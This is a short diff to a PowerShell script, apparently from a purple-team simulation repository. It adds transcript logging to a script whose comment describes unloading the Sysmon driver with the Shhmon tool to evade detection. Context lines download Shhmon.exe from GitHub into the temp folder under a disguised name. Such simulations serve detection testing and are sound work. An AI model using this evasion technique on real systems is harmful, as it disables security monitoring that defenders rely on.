@@ -5,6 +5,8 @@
     Unload Sysmon driver with Shhmon, allow the attacker to bypass sysmon detections (most of it, network monitoring will still be effective)
 #>
 
+Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append
+
 $outfile = "$env:tmp\Sysmonk.exe"
 $url = "https://github.com/mthcht/Purpleteam/blob/main/Simulation/Windows/_bin/Shhmon.exe?raw=true"
 
@@ -31,3 +33,5 @@ try{
 catch{
     Write-Error $_
 }
+
+Stop-Transcript
